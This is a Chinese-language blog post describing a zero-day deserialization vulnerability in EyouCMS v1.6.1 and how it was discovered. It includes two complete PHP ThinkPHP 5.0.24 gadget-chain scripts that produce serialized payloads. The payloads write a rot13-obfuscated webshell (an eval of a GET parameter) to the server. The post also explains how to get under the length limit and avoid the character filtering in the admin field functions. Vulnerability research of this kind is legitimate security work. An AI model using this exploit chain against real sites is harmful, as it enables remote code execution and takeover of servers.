 [Home]()[About]()[Writing]()[links]()

[1. EyouCMS v1.6.1 反序列化漏洞](#EyouCMS-v1-6-1-反序列化漏洞)

# EyouCMS v1.6.1 0day挖掘

N1k0la

2023-01-28

前言

官网地址：https://www.eyoucms.com/

看到很多EyouCMS的XSS，从官网下载源码随便看看。

## EyouCMS v1.6.1 反序列化漏洞

![image-20230128235231851](https://nssctf.wdf.ink//img/WDTJ/202304191404547.png)

`application/admin/controller/Field.php#channel_edit`调用了`unserialize`，`unserialize`的参数无法直接控制。

此处反序列化的参数来自数据库的查询结果，很容易想到通过`channel_add`函数向数据库中插入序列化数据，非常简单的思路，但是问题却没有这么简单。

在`channel_add`函数中，如果传入的字段类型为区域，那么将无法控制默认值。

![image-20230129001025280](https://nssctf.wdf.ink//img/WDTJ/202304191404744.png)

测试了`application/admin/controller/Field.php`中的一些功能后，发现`arctype_edit`函数和`channel_edit`函数操作的是同一张表，此时想到也许可以用`arctype_edit`代替`channel_edit`来修改数据库中的数据。

![image-20230129002650299](https://nssctf.wdf.ink//img/WDTJ/202304191404463.png)

果然可以。

![img](https://nssctf.wdf.ink//img/WDTJ/202304191404133.png)

EyouCMS基于ThinkPHP 5.0.24，直接用ThinkPHP 5.0.24的反序列化链。

```
<?php

namespace think\cache\driver;
class File
{
    protected $tag='t';
    protected $options = [
        'expire'        => 0,
        'cache_subdir'  => false,
        'prefix'        => false,
        'path'          => 'php://filter/string.rot13/resource=<?cuc @riny($_TRG[_]);?>/../a.php',
        'data_compress' => false,
    ];
}
namespace think\session\driver;
use think\cache\driver\File;
class Memcached
{
    protected $handler;
    function __construct()
    {
        $this->handler=new File();
    }
}
namespace think\console;
use think\session\driver\Memcached;
class Output
{
    protected $styles = ['removeWhereField'];
    function __construct()
    {
        $this->handle=new Memcached();
    }
}
namespace think\model\relation;
use think\console\Output;
class HasOne
{
    function __construct()
    {
        $this->query=new Output();
    }

}
namespace think\model;
use think\model\relation\HasOne;
class Pivot
{
    protected $append = ['getError'];
    public function __construct()
    {
        $this->error=new HasOne();
    }
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
$x=new Windows();
echo base64_encode(serialize($x));
```

因为不存在字段名称为channel_add的arctype，所以报错了。

![image-20230129004039718](https://nssctf.wdf.ink//img/WDTJ/202304191404577.png)

通过`arctype_add`函数新增一个字段名称为channel_add的arctype后重新发包，因为序列化数据的长度超过了最大长度500又报错了。删除了一些无关紧要的类属性同时将类属性的访问控制修改为`public`以缩短序列化数据的长度，最终序列化数据长度为499，极限绕过。

```
<?php

namespace think\cache\driver;
class File
{
    public $tag='t';
    public $options = [
        'path'          => 'php://filter/string.rot13/resource=<?cuc @riny($_TRG[_]);?>/../a.php'
    ];
}
namespace think\session\driver;
use think\cache\driver\File;
class Memcached
{
    public $handler;
    function __construct()
    {
        $this->handler=new File();
    }
}
namespace think\console;
use think\session\driver\Memcached;
class Output
{
    public $styles = ['removeWhereField'];
    function __construct()
    {
        $this->handle=new Memcached();
    }
}
namespace think\model\relation;
use think\console\Output;
class HasOne
{
    function __construct()
    {
        $this->query=new Output();
    }

}
namespace think\model;
use think\model\relation\HasOne;
class Pivot
{
    public $append = ['getError'];
    public function __construct()
    {
        $this->error=new HasOne();
    }
}
namespace think\process\pipes;
use think\model\Pivot;
class Windows
{
    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
$x=new Windows();
echo strlen(serialize($x));
echo base64_encode(serialize($x));
```

![image-20230129010350387](https://nssctf.wdf.ink//img/WDTJ/202304191404605.png)

本以为大功告成，但是调用`channel_edit`函数后并没有如预期那样写入webshell，发现数据库中的序列化数据少了一些字符。

![image-20230129010820213](https://nssctf.wdf.ink//img/WDTJ/202304191404917.png)

分析源码，当传入的字段类型为区域时，默认值中的一些字符会被替换为空。

![image-20230129011242012](https://nssctf.wdf.ink//img/WDTJ/202304191404965.png)

通过传入数组的方式就能够使传入的字段类型不满足`if`的条件，从而避免序列化数据中的一些字符被替换为空。

![image-20230129012654812](https://nssctf.wdf.ink//img/WDTJ/202304191404326.png)

最后触发反序列化写入webshell。

![image-20230129012948503](https://nssctf.wdf.ink//img/WDTJ/202304191404278.png)

![image-20230129013037290](https://nssctf.wdf.ink//img/WDTJ/202304191404545.png)

[ Menu](#) [ TOC](#) [ Share](#)

Copyright © 2020-2023 N1k0la

[Home]()[About]()[Writing]()[links]()